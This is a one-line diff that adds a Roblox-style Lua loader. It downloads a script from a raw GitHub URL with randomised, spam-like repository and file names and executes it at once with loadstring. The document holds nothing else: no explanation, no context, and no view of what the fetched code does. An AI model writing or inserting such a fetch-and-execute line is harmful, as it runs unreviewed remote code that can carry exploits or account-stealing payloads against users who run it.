@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/electricity-bricklayer-spam4-bspd5fvmo3twjo.lua"))()
